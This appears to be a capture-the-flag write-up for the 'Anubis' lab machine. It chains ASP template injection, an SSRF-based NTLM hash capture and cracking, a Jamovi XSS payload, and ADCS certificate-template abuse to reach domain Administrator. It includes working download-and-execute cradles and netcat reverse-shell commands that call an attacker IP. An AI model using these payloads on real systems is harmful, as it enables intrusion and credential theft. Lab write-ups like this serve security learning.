# Anubis

## Webserver Shell

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.190.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 04:21 EDT
Nmap scan report for 10.129.95.208
Host is up (0.024s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
443/tcp   open  https
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49703/tcp open  unknown
```

### Windcorp -> SSTI&#x20;

`crackmapexec` can be used to enumerate domain name.&#x20;

{% code overflow="wrap" %}
```
$ crackmapexec smb 10.129.190.189                                       
[*] completed: 100.00% (1/1)
SMB         10.129.190.189  445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
```
{% endcode %}

Visiting `windcorp.htb` does not show anything though. In this case, we can do a sub-domain enumeration and find something.&#x20;

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.windcorp.htb' --hc=404 -u https://windcorp.htb  
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000001:   200        1007 L   3245 W     46774 Ch    "www"
```

Add the domains to the `/etc/hosts` file, and `www` is visited it shows a typical corporate page:

<figure><img src="../../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

When we fill in the Contact and try to submit, it let's us preview our submission at `preview.asp`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>

Here's the HTTP request for the `Send` function, which is a GET request to `save.asp`:

```http
GET /save.asp?name=test&email=test%40website.com&subject=test&message=test HTTP/2
Host: www.windcorp.htb
Cookie: ASPSESSIONIDAEDSDSSQ=PAFDFIPAFOLMPNMELMKFNMFL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.windcorp.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

```

Interesting. Since this is using `asp`, and the output is printed on another screen, we can test some SSTI. I used this payload:

<figure><img src="../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

And this was returned:

<figure><img src="../../../.gitbook/assets/image (3174).png" alt=""><figcaption></figcaption></figure>

This confirms that SSTI is possible on this machine, and that we can use this to gain a reverse shell (if there's no AMSI / AppLocker).&#x20;

{% code overflow="wrap" %}
```
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/shell.ps1')").StdOut.ReadAll() %>
```
{% endcode %}

Using this, we can get a reverse shell easily.&#x20;

<figure><img src="../../../.gitbook/assets/image (2711).png" alt=""><figcaption></figcaption></figure>

## Localadmin Creds

### Cert Rq -> Port Forwarding

Perhaps the first thing we notice is that we are already the SYSTEM user. This is a little early for an Insane machine, so it's probably one of the hosts in the domain. I thought that there would be a flag within the administrator's desktop, but instead I got a certificate:

```
PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----        5/24/2021   9:36 PM            989 req.txt

PS C:\Users\Administrator\Desktop> type req.txt
-----BEGIN CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
4TlwpQ==
-----END CERTIFICATE REQUEST-----
```

We can transfer this back to our machine for analysis using `openssl`.&#x20;

```
$ openssl req -in req.txt -text -noout      
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a6:9b:4a:ff:85:91:c2:2a:c2:bf:04:3e:ce:15:
                    d2:f6:23:db:c5:f2:82:1e:6a:13:12:f4:b6:fd:b1:
                    32:44:14:24:c7:1b:10:9d:85:15:fe:c6:d8:ac:44:
                    1b:c0:00:51:0e:b8:f5:14:05:62:9b:04:41:c8:1f:
                    66:e1:18:47:c2:7a:78:48:2e:5f:fd:45:10:ae:00:
                    a2:f4:8a:e8:f6:9d:02:ab:1d:0d:43:cc:31:15:b8:
                    89:19:9d:36:a4:8f:70:3e:02:1b:d3:3e:7b:4b:78:
                    48:0d:7f:99:77:dd:c6:ce:70:72:05:9b:70:bd:db:
                    f7:1f:d8:8b:e3:1e:16:89:59:bf:b8:6b:fe:8f:81:
                    39:5c:c4:13:27:7b:93:ac:47:ee:21:73:86:08:84:
                    b9:f3:40:ca:15:52:ac:bb:c0:8d:d5:67:6b:63:4a:
                    1e:92:8a:23:d4:e3:e5:60:fe:7b:f1:ff:f6:0d:c8:
                    46:ac:de:68:c0:fc:34:99:89:cc:ec:a8:3b:c2:34:
                    cd:b8:61:93:aa:aa:65:48:c6:59:90:08:02:b8:5a:
                    ca:3b:1c:cc:21:68:a9:6e:7b:77:2e:dc:fa:45:3a:
                    ff:88:27:d6:a5:b0:d5:ad:f3:17:53:b5:51:22:a4:
                    26:70:59:13:c5:bc:61:6e:d7:1e:79:4a:fb:38:d4:
                    a7:77
                Exponent: 65537 (0x10001)
        Attributes:
            (none)
            Requested Extensions:
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        6b:ac:75:c1:11:97:70:30:62:4c:0f:87:27:33:07:96:36:9b:
        63:91:72:c9:3a:0b:50:30:09:23:5e:f3:24:bc:46:81:51:54:
        79:5c:5d:61:ed:1b:af:d2:fd:d6:2b:3b:9a:e8:50:f1:2f:6c:
        d8:ac:b5:8b:2d:8f:59:6e:63:8a:de:cc:70:f6:7a:f0:da:e6:
        6d:8c:25:bc:d5:ac:17:ba:5c:67:b2:d8:54:6d:b8:57:9e:ec:
        21:d1:7f:33:3a:11:dc:3a:6a:3b:94:ff:0e:6f:60:37:23:ad:
        c8:a4:27:9a:13:08:a3:8d:65:d5:fd:9c:7c:57:dc:a8:c8:e9:
        5d:cc:1a:1e:2c:7b:6c:29:71:56:86:d6:a2:59:79:bf:6f:b8:
        5f:04:cf:69:a3:45:86:d6:f2:f0:0d:45:17:4f:4d:0d:2a:7c:
        67:c2:4c:c9:51:91:c7:61:6f:1a:b2:77:f6:f2:2b:8e:53:0c:
        28:58:fa:33:71:80:99:db:c7:f8:83:bf:0f:90:7a:24:21:04:
        dd:a9:ae:c5:4d:38:08:81:f0:08:8e:42:d3:84:f6:29:a0:8d:
        e1:4e:b5:d7:63:c3:21:2d:2d:3a:e6:41:8f:c8:1d:60:8b:20:
        05:8b:05:0d:e0:ed:a7:6d:e0:e0:9b:11:e9:2a:2c:12:2b:28:
        e1:39:70:a5
```

We can see that it makes requests to a `softwareportal.windcorp.htb` domain. However, when trying to visit it, nothing is loaded. This must mean that the domain is listening within the machine only.&#x20;

First, let's see if there are any web servers active on the machine itself.

```
PS C:\Windows\System32\Drivers\etc> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Ethernet):

   Connection-specific DNS Suffix  . : .htb
   Link-local IPv6 Address . . . . . : fe80::15ac:75b5:201b:3baf%32
   IPv4 Address. . . . . . . . . . . : 172.25.95.242
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 172.25.80.1

PS C:\Windows\System32\Drivers\etc> curl 172.25.80.1
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 
4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Not Found</h2>
<hr><p>HTTP Error 404. The requested resource is not found.</p>
</BODY></HTML>
```

The error tells me that there's something present there, so let's do some port forwarding for the machine using `chisel`.&#x20;

```bash
# on kali
chisel server -p 5555 --reverse
# on Windows
.\chisel.exe client 10.10.14.14:5555 R:socks
```

Afterwards, we can add `softwareportal.windcorp.htb` within our `/etc/hosts` file under `172.25.80.1`, and visit it using our browser (with FoxyProxy Proxychains).&#x20;

<figure><img src="../../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>

### VNC -> Responder Creds

Within the software present on the page, we can see that there is a VNC service available.

<figure><img src="../../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

When we click on it, it would show us this page before going back to the main website. The URL also contains another IP address:

{% code overflow="wrap" %}
```
http://softwareportal.windcorp.htb/install.asp?client=172.20.159.137&software=VNC-Viewer-6.20.529-Windows.exe
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2949).png" alt=""><figcaption></figcaption></figure>

Since VNC is like an RDP software, there might potentially be credentials beign sent in the packets, so I started `wireshark` and also changed the `client` parameter to be my IP address. When the packets are viewed, we can see a lot of failed TCP requests:

<figure><img src="../../../.gitbook/assets/image (1406).png" alt=""><figcaption></figcaption></figure>

This occurs because port 5985 is not open on our machine. So, using this SSRF, we can start `responder` and intercept the request to retrieve any NTLM hashes, which works:

<figure><img src="../../../.gitbook/assets/image (2399).png" alt=""><figcaption></figcaption></figure>

We can then crack this hash easily using `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Secret123        (localadmin)     
1g 0:00:00:00 DONE (2023-05-15 11:38) 1.515g/s 3171Kp/s 3171Kc/s 3171KC/s Smudge2..SaS1993
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Then, we can verify these creds with with SMB:

```
$ crackmapexec smb 10.129.190.189 -u localadmin -p Secret123
  if result['type'] is not 'searchResEntry':
SMB         10.129.190.189  445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
SMB         10.129.190.189  445    EARTH            [+] windcorp.htb\localadmin:Secret123
```

## Diego Shell

### SMB Access

We can enumerate the shares as `localadmin`.

```
$ smbmap -u 'localadmin' -p 'Secret123' -H 10.129.190.189
[+] IP: 10.129.190.189:445      Name: windcorp.htb                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

We can view `Shared` first.&#x20;

```
$ smbclient  //10.129.190.189/Shared -U 'windcorp.htb/localadmin'
Password for [WINDCORP.HTB\localadmin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr 28 11:06:06 2021
  ..                                  D        0  Wed Apr 28 11:06:06 2021
  Documents                           D        0  Tue Apr 27 00:09:25 2021
  Software                            D        0  Thu Jul 22 14:14:16 2021
```

I got a bit lazy, so I recursively downloaded all of the files from this share.&#x20;

```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \Software\7z1900-x64.exe of size 1447178 as Software/7z1900-x64.exe (2355.4 KiloBytes/sec) (average 2355.4 KiloBytes/sec)
getting file \Software\jamovi-1.6.16.0-win64.exe of size 247215343 as Software/jamovi-1.6.16.0-win64.exe (13699.2 KiloBytes/sec) (average 13325.7 KiloBytes/sec)
getting file \Software\VNC-Viewer-6.20.529-Windows.exe of size 10559784 as Software/VNC-Viewer-6.20.529-Windows.exe (13306.2 KiloBytes/sec) (average 13324.9 KiloBytes/sec)
getting file \Documents\Analytics\Big 5.omv of size 6455 as Documents/Analytics/Big 5.omv (191.0 KiloBytes/sec) (average 13302.1 KiloBytes/sec)
getting file \Documents\Analytics\Bugs.omv of size 2897 as Documents/Analytics/Bugs.omv (101.0 KiloBytes/sec) (average 13282.7 KiloBytes/sec)
getting file \Documents\Analytics\Tooth Growth.omv of size 2142 as Documents/Analytics/Tooth Growth.omv (77.5 KiloBytes/sec) (average 13264.1 KiloBytes/sec)
getting file \Documents\Analytics\Whatif.omv of size 2841 as Documents/Analytics/Whatif.omv (106.7 KiloBytes/sec) (average 13246.2 KiloBytes/sec)
```

Here, we can see some `.exe` and `.omv` files, which are associated with Javmovi.&#x20;

### Javmovi RCE

When researhcing for Jamovi exploits, I came across this:

{% embed url="https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md" %}

The author of the PoC above is also the creator of this box, so I think we need to exploit something similar for this. The intended method is probably to run and install Jamovi on a Windows instance and then perform the XSS, but there are faster methods, such as here:

{% embed url="https://github.com/g33xter/CVE-2021-28079" %}

We can follow this PoC and `unzip` the file, then modify our metadata to include our XSS payload. First, let's craft our JS shell:

```javascript
const exp = require('child_process');
exp.exec("powershell -c wget 10.10.14.14:8000/nc64.exe -outfile C:\\Windows\\Tasks\\nc.exe");
exp.exec("C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.14.14 4444");
```

Then, we can change the `name` parameter to this:

```
<script src=\"http://10.10.14.14/jamovi.js\"></script>
```

Afterwards, re-zip the `Whatif.omv` file together, and host the respective Python HTTP servers. Then, we need to use `smbclient` to delete the old `Whatif.omv` file on the share and replace it with our own.

```
smb: \Documents\Analytics\> del Whatif.omv 
smb: \Documents\Analytics\> put Whatif.omv 
putting file Whatif.omv as \Documents\Analytics\Whatif.omv (130.9 kb/s) (average 130.9 kb/s)
```

Then we just wait. After a while, we would start to get calls on our HTTP servers and get a reverse shell as the user.&#x20;

<figure><img src="../../../.gitbook/assets/image (1449).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

## Privilege Escalation

### ESC1 Exploit

Earlier, we saw a share about `CertEnroll`, which is a possible exploit path to get an Administrator shell. First, let's use `Certify.exe` to locate any vulnerable templates on the machine.&#x20;

```
C:\Users\diegocruz\Desktop>.\Certify.exe find
<TRUNCATED>
CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
```

It seems that the `webdevelopers` group has Full Control over this one template, and makes it vulnerable to some exploits:

{% embed url="https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366" %}

However, we have to note that this template is used for **Server Authentication** instead of **Client Authentication**. This means that we cannot directly request a certificate and use `rubeus` to obtain the NTLM hash of the administrator yet.

We have to either change this or make it such that we can still impersonate the administrator. I couldn't really figure this part out, so I used a writeup that redirected me to this repo:

{% embed url="https://github.com/cfalta/PoshADCS" %}

The repo itself explains the exploit in detail, something I found rather helpful. Basically, we want to create a 'Smart Card' for the user, and allow the certificate to be used for Smart Card authentication. This would allow us to impersonate the user using this new certificate.&#x20;

```powershell
Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard
```

Afterwards, when we check `Certify.exe`, we can see that the vulnerable template has changed:

```
CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    <TRUNCATED>
    pkiextendedkeyusage                   : Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Server Authentication, Smart Card Logon
```

Afterwards, we can use `Get-ChildItem` to retrieve the certificate's ID, and `rubeus` to request for the NTLM hash of the administrator:

<pre><code>PS C:\Windows\Tasks> gci cert:\currentuser\my -recurse


   PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my

Thumbprint                                Subject                                                                      
----------                                -------                                                                      
1C7115A30632E82A04A73417975975193492958

<strong>PS C:\Windows\Tasks> .\rubeus.exe asktgt /user:Administrator /getcredentials /certificate:1C7115A30632E82A04A73417975975193492958
</strong><strong>&#x3C;TRUNCATED>
</strong> ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  1/26/2022 2:02:44 PM
  EndTime                  :  1/27/2022 12:02:44 AM
  RenewTill                :  2/2/2022 2:02:44 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  eFQWOai0Ha57hYJqqDcGUA==
  ASREP (key)              :  B98F843C14877A1B3AF0F77C3A82999E

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09
</code></pre>

Then, using this hash, we can easily `psexec.py` in as the administrator and grab the root flag:

<figure><img src="../../../.gitbook/assets/image (2218).png" alt=""><figcaption></figcaption></figure>

This part was pretty hard for me, and I had to use a walkthrough because I couldn't find the right tools to use. Great machine though!&#x20;
